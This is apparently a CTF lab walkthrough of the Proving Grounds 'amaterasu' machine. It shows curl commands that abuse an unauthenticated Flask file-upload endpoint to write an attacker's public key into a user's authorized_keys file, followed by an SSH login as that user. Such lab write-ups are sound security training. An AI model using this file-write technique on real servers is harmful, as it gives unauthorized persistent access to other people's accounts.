---
layout: default
title: File Upload (Curl)
parent: Web Exploits
nav_order: 3
---

# Discovery of File Upload via Curl POST Reuqest

Running Gobuster we find _/help_ directory.

![help](../../../../assets/images/ctfs/proving_grounds/amaterasu/help.png)

It appears we can use a CURL POST request to upload a file to _/file-upload_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ curl -L -i -X POST -H "Content-Type: multipart/form-data" -F file=@"test.txt" -F filename="test.txt" http://192.168.160.249:33414/file-upload
HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Sun, 12 Nov 2023 23:10:50 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}

```

Checking the Flask server we can see the file was uploaded.

![test](../../../../assets/images/ctfs/proving_grounds/amaterasu/test.png)

We have LFI and now need to determine how best to exploit this.

# Exploitation

---

Checking the _/home_ directory we see there is a user directory _/alfredo_.

We can attempt to generate a new _id_rsa_ file to replace his existing RSA private key for SSH authentication.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vagrant/.ssh/id_rsa): /home/vagrant/Documents/PG/PLAY/amatera
su/id_alfredo
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/vagrant/Documents/PG/PLAY/amaterasu/id_alfredo
Your public key has been saved in /home/vagrant/Documents/PG/PLAY/amaterasu/id_alfredo.pub

```

Now upload to the _/home/aldredo_ directory.

We need to upload as a _.txt_ file and remove the file extension on the remote directory where it is being uploaded.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ mv id_alfredo.pub id_alfredo.txt

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.txt http://192.168.160.249:33414/file-upload
{"message":"File successfully uploaded"}


```

![authorized](../../../../assets/images/ctfs/proving_grounds/amaterasu/authorized.png)

Now we can authenticate to the SSH service as _alfredo_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ ssh -p 25022 -i id_alfredo alfredo@192.168.160.249
Last failed login: Sun Nov 12 18:28:25 EST 2023 from 192.168.45.217 on ssh:notty
There were 3 failed login attempts since the last successful login.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
```
